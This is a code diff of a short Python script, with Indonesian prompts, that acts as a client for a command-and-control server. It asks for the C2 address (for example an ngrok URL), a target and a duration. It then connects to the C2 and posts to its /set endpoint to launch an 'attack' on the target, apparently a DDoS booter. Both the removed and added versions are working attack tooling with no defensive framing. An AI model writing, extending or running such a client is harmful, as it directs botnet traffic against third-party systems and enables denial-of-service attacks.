@@ -1,26 +1,31 @@
-import requests, time, os
-from colorama import Fore, Style
+import requests, os
+from colorama import Fore
 
 os.system("clear")
-print(Fore.CYAN + "=== CLIENT C2 ===" + Style.RESET_ALL)
-
-api = input(Fore.YELLOW + "MASUKAN API http://IP:PORT : " + Style.RESET_ALL)
-target = input(Fore.GREEN + "MASUKAN TARGET : " + Style.RESET_ALL)
-durasi = input(Fore.RED + "MASUKAN DURASI : " + Style.RESET_ALL)
+print(Fore.CYAN + "[*] MASUKKAN API C2 (contoh: https://xxxx.ngrok.io)")
+api = input(Fore.GREEN + "API C2: ")
+target = input(Fore.YELLOW + "MASUKAN TARGET: ")
+durasi = input(Fore.RED + "MASUKAN DURASI (detik): ")
 
 headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Accept": "text/html,application/xhtml+xml,application/xml",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Connection": "keep-alive",
-    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0",
+    "Accept": "*/*",
+    "Connection": "keep-alive"
 }
 
 try:
-    res = requests.post(f"{api}/set", json={"target": target, "time": durasi}, headers=headers)
-    if res.status_code == 200:
-        print(Fore.CYAN + f"[+] Serangan dikirim ke {target} selama {durasi} detik" + Style.RESET_ALL)
-    else:
-        print(Fore.RED + "[!] Gagal mengirim perintah" + Style.RESET_ALL)
+    r = requests.post(f"{api}/connect", headers=headers)
+    if r.ok:
+        print(Fore.CYAN + f"[+] TERHUBUNG KE C2: {api}")
 except Exception as e:
-    print(Fore.RED + f"[!] ERROR: {e}" + Style.RESET_ALL)
+    print(Fore.RED + f"[!] Gagal connect ke C2: {e}")
+    exit()
+
+try:
+    res = requests.post(f"{api}/set", json={"target": target, "time": durasi}, headers=headers)
+    if res.ok:
+        print(Fore.GREEN + "[+] Serangan dikirim!")
+    else:
+        print(Fore.RED + "[!] Gagal kirim perintah.")
+except Exception as err:
+    print(Fore.RED + f"[!] Error: {err}")
